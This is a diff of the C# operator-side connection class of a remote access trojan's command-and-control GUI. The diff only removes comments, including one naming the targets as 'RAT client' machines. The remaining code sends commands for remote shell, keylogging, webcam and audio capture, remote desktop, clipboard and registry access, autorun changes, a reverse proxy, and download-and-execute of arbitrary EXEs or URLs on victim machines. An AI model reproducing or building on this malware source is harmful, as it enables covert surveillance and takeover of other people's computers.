@@ -24,23 +24,23 @@ namespace RWORM.GUI.Services
 
 {
 
-    /// <summary>
+    
 
-    /// Manages the GUI→Server connection.
+    
 
-    /// All C2 commands are prefixed with  targetGuid + '\x00' + payload
+    
 
-    /// so the server can route them to the correct RAT client.
+    
 
-    /// Incoming packets from the server are prefixed with guid + '\x00' + data.
+    
 
-    /// </summary>
+    
 
     public class ServerConnection
 
     {
 
-        // ── Transport ─────────────────────────────────────────────────────────
+        
 
         private TcpClient?     _client;
 
@@ -60,11 +60,11 @@ namespace RWORM.GUI.Services
 
 
 
-        // ── Routing ───────────────────────────────────────────────────────────
+        
 
-        // Per-guid callbacks for typed responses.
+        
 
-        // Key = guid, Value = dict of packetType -> handler
+        
 
         private readonly Dictionary<string, Dictionary<byte, Action<byte[]>>> _handlers = new();
         private readonly Dictionary<string, Dictionary<byte, Action<byte[], int>>> _channelHandlers = new();
@@ -100,7 +100,7 @@ namespace RWORM.GUI.Services
 
 
 
-        // ── Connect / Disconnect ──────────────────────────────────────────────
+        
 
         public async Task<bool> ConnectAsync()
 
@@ -150,7 +150,7 @@ namespace RWORM.GUI.Services
 
 
 
-        // ── Client list ───────────────────────────────────────────────────────
+        
 
         public async Task<List<ClientModel>> GetClientsAsync()
 
@@ -168,7 +168,7 @@ namespace RWORM.GUI.Services
 
 
 
-        // ── Shell helpers ─────────────────────────────────────────────────────
+        
 
         public void RegisterShellHandler(string guid, Action<string> handler)
 
@@ -188,7 +188,7 @@ namespace RWORM.GUI.Services
 
 
 
-        // ── File Manager ─────────────────────────────────────────────────────
+        
 
         public Task RequestFileListAsync(string guid, string path, Action<byte[]> cb)
 
@@ -246,7 +246,7 @@ namespace RWORM.GUI.Services
 
 
 
-        // ── Keylogger ─────────────────────────────────────────────────────────
+        
 
         public void RegisterKeylogHandler(string guid, Action<string> cb)
 
@@ -264,7 +264,7 @@ namespace RWORM.GUI.Services
 
 
 
-        // ── Process Manager ──────────────────────────────────────────────────
+        
 
         public Task RequestProcessList(string guid, Action<byte[]> cb)
 
@@ -282,7 +282,7 @@ namespace RWORM.GUI.Services
 
 
 
-        // ── Registry ─────────────────────────────────────────────────────────
+        
 
         public Task RequestRegList(string guid, string fullPath, Action<byte[]> cb)
 
@@ -306,7 +306,7 @@ namespace RWORM.GUI.Services
 
 
 
-        // ── Loader ────────────────────────────────────────────────────────────
+        
 
         public Task LoaderExec(string guid, string url, Action<byte[]>? cb = null)
 
@@ -324,7 +324,7 @@ namespace RWORM.GUI.Services
 
 
 
-        // ── Remote Desktop ────────────────────────────────────────────────────
+        
 
         public void RegisterRDHandler(string guid, Action<byte[]> cb)
 
@@ -332,7 +332,7 @@ namespace RWORM.GUI.Services
 
         public void UnregisterRDHandler(string guid) => UnregisterHandler(guid, 0x81);
 
-        // ── System Metrics ───────────────────────────────────────────────────
+        
 
         public void RegisterMetricsHandler(string guid, Action<byte[]> cb)
 
@@ -344,7 +344,7 @@ namespace RWORM.GUI.Services
 
 
 
-        // ── Remote Desktop Monitors ──────────────────────────────────────────
+        
 
         public void RegisterRDMonitorsHandler(string guid, Action<byte[]> cb)
 
@@ -362,7 +362,7 @@ namespace RWORM.GUI.Services
         public Task SendRemoteDesktopInput(string guid, string inputPayload)
             => GuiSend(0x82, guid, Encoding.UTF8.GetBytes(inputPayload));
 
-        // ── Service Manager ──────────────────────────────────────────────────
+        
         public void RegisterServicesHandler(string guid, Action<byte[]> cb) => RegisterHandler(guid, 0xC1, cb);
         public void UnregisterServicesHandler(string guid) => UnregisterHandler(guid, 0xC1);
         public Task RequestServices(string guid) => GuiSend(0xC0, guid, Array.Empty<byte>());
@@ -372,12 +372,12 @@ namespace RWORM.GUI.Services
             return GuiSend(0xC2, guid, Encoding.UTF8.GetBytes($"{serviceName}\x00{action}"));
         }
 
-        // ── Net Monitor ───────────────────────────────────────────────────────
+        
         public void RegisterNetHandler(string guid, Action<byte[]> cb) => RegisterHandler(guid, 0xC5, cb);
         public void UnregisterNetHandler(string guid) => UnregisterHandler(guid, 0xC5);
         public Task RequestNetConnections(string guid) => GuiSend(0xC4, guid, Array.Empty<byte>());
 
-        // ── Autorun Manager ───────────────────────────────────────────────────
+        
         public void RegisterStartupHandler(string guid, Action<byte[]> cb) => RegisterHandler(guid, 0xC7, cb);
         public void UnregisterStartupHandler(string guid) => UnregisterHandler(guid, 0xC7);
         public Task RequestStartupEntries(string guid) => GuiSend(0xC6, guid, Array.Empty<byte>());
@@ -387,7 +387,7 @@ namespace RWORM.GUI.Services
             return GuiSend(0xC8, guid, Encoding.UTF8.GetBytes($"{scope}\x00{name}\x00{location}"));
         }
 
-        // ── Clipboard Manager ─────────────────────────────────────────────────
+        
         public void RegisterClipboardHandler(string guid, Action<byte[]> cb) => RegisterHandler(guid, 0xCB, cb);
         public void UnregisterClipboardHandler(string guid) => UnregisterHandler(guid, 0xCB);
         public Task RequestClipboard(string guid) => GuiSend(0xCA, guid, Array.Empty<byte>());
@@ -399,7 +399,7 @@ namespace RWORM.GUI.Services
 
 
 
-        // ── URL & System Tools ───────────────────────────────────────────────
+        
         public Task OpenUrl(string guid, string url, Action<byte[]>? cb = null)
         {
             if (cb != null) RegisterHandler(guid, 0xD1, cb);
@@ -420,7 +420,7 @@ namespace RWORM.GUI.Services
             return GuiSend(0xD6, guid, Encoding.UTF8.GetBytes(action));
         }
 
-        // ── Webcam ────────────────────────────────────────────────────────────
+        
         public void RegisterWebcamDevicesHandler(string guid, Action<byte[]> cb) => RegisterHandler(guid, 0xE1, cb);
         public void UnregisterWebcamDevicesHandler(string guid) => UnregisterHandler(guid, 0xE1);
         public Task RequestWebcamDevices(string guid) => GuiSend(0xE0, guid, Array.Empty<byte>());
@@ -431,21 +431,21 @@ namespace RWORM.GUI.Services
             => GuiSend(0xE2, guid, Encoding.UTF8.GetBytes(deviceIndex.ToString()));
         public Task StopWebcam(string guid) => GuiSend(0xE4, guid, Array.Empty<byte>());
 
-        // ── Audio ─────────────────────────────────────────────────────────────
+        
         public void RegisterAudioStreamHandler(string guid, Action<byte[]> cb) => RegisterHandler(guid, 0xE6, cb);
         public void UnregisterAudioStreamHandler(string guid) => UnregisterHandler(guid, 0xE6);
         public Task StartAudio(string guid) => GuiSend(0xE5, guid, Array.Empty<byte>());
         public Task StopAudio(string guid) => GuiSend(0xE7, guid, Array.Empty<byte>());
 
-        // ── MessageBox 0xD8-0xD9 ─────────────────────────────────────────────
+        
         public Task ShowRemoteMessageBox(string guid, string title, string message, uint buttons = 0, uint icon = 0, Action<byte[]>? cb = null)
         {
             if (cb != null) RegisterHandler(guid, 0xD9, cb);
 
-            // Serialize properly: the message text is multiline (AcceptsReturn),
-            // and hand-rolled "\ and \" escaping emits raw newlines / control
-            // chars, which is invalid JSON — the client then fails to parse and
-            // falls back to showing the raw payload.
+            
+            
+            
+            
             string json = JsonSerializer.Serialize(new
             {
                 title = title ?? "",
@@ -457,7 +457,7 @@ namespace RWORM.GUI.Services
             return GuiSend(0xD8, guid, Encoding.UTF8.GetBytes(json));
         }
 
-        // ── Reverse Proxy 0x90-0x92 ──────────────────────────────────────────
+        
         public void RegisterProxyDataHandler(string guid, Action<byte[], int> cb) => RegisterChannelHandler(guid, 0x91, cb);
         public void UnregisterProxyDataHandler(string guid) => UnregisterChannelHandler(guid, 0x91);
 
@@ -465,13 +465,13 @@ namespace RWORM.GUI.Services
         public Task ProxySend(string guid, int channel, byte[] data) => GuiSend(0x91, guid, data, channel);
         public Task ProxyStop(string guid, int channel) => GuiSend(0x92, guid, Array.Empty<byte>(), channel);
 
-        // ── Client Chat 0xEA-0xEC ─────────────────────────────────────────────
+        
         public void RegisterChatRecvHandler(string guid, Action<byte[]> cb) => RegisterHandler(guid, 0xEB, cb);
         public void UnregisterChatRecvHandler(string guid) => UnregisterHandler(guid, 0xEB);
         public Task SendChatMessage(string guid, string message) => GuiSend(0xEA, guid, Encoding.UTF8.GetBytes(message));
         public Task CloseClientChat(string guid) => GuiSend(0xEC, guid, Array.Empty<byte>());
 
-        // ── Client control ────────────────────────────────────────────────────
+        
 
         public Task ClientClose(string guid)     => GuiSend(0xA0, guid, Array.Empty<byte>());
 
@@ -491,9 +491,9 @@ namespace RWORM.GUI.Services
 
 
 
-        // ── Tasks ─────────────────────────────────────────────────────────────
+        
 
-        /// Send raw EXE bytes → client writes to temp → exec (0xB0).
+        
 
         public Task RunFileTaskAsync(string guid, byte[] exeBytes, Action<byte[]>? cb = null)
 
@@ -507,7 +507,7 @@ namespace RWORM.GUI.Services
 
 
 
-        /// Send URL for client to download + exec (0x70, reuses Loader).
+        
 
         public Task RunUrlTaskAsync(string guid, string url, Action<byte[]>? cb = null)
 
@@ -521,7 +521,7 @@ namespace RWORM.GUI.Services
 
 
 
-        // ── One-shot shell command (legacy) ───────────────────────────────────
+        
 
         public async Task<string> SendCommandAsync(string guid, string command)
 
@@ -537,13 +537,13 @@ namespace RWORM.GUI.Services
 
 
 
-        // ── Internal routing helpers ──────────────────────────────────────────
+        
 
         private Task GuiSend(byte type, string guid, byte[] rest, int channel = 0)
 
         {
 
-            // Build: [type][guid\x00rest]
+            
 
             var guidBytes = Encoding.UTF8.GetBytes(guid + '\x00');
 
@@ -613,7 +613,7 @@ namespace RWORM.GUI.Services
 
 
 
-        // ── Receive loop ──────────────────────────────────────────────────────
+        
 
         private async void ReceiveLoop()
 
@@ -730,7 +730,7 @@ namespace RWORM.GUI.Services
 
             {
 
-                case 0x04:  // legacy SHELL_OUTPUT
+                case 0x04:  
 
                     OutputReceived?.Invoke(this, Encoding.UTF8.GetString(payload));
 
@@ -738,7 +738,7 @@ namespace RWORM.GUI.Services
 
 
 
-                case 0x11:  // GET_CLIENTS response
+                case 0x11:  
 
                     try
 
@@ -762,7 +762,7 @@ namespace RWORM.GUI.Services
 
 
 
-            // All other packets are prefixed with guid\x00
+            
 
             int sep = Array.IndexOf(payload, (byte)0);
 
@@ -803,13 +803,13 @@ namespace RWORM.GUI.Services
 
             {
 
-                // No handler: only forward printable text. Binary payloads
+                
 
-                // (e.g. RD frames still in flight after a window closed) used
+                
 
-                // to be dumped into the terminal as UTF-8 garbage — at 10+ fps
+                
 
-                // that floods the UI with megabytes of text and freezes it.
+                
 
                 if (LooksLikeText(rest))
 
@@ -829,7 +829,7 @@ namespace RWORM.GUI.Services
 
 
 
-        /// <summary>True when the payload is short and mostly printable text.</summary>
+        
 
         private static bool LooksLikeText(byte[] data)
 
@@ -857,7 +857,7 @@ namespace RWORM.GUI.Services
 
 
 
-        // ── Packet builder ────────────────────────────────────────────────────
+        
 
         private static byte[] Build(byte type, string text) => Build(type, Encoding.UTF8.GetBytes(text));
 
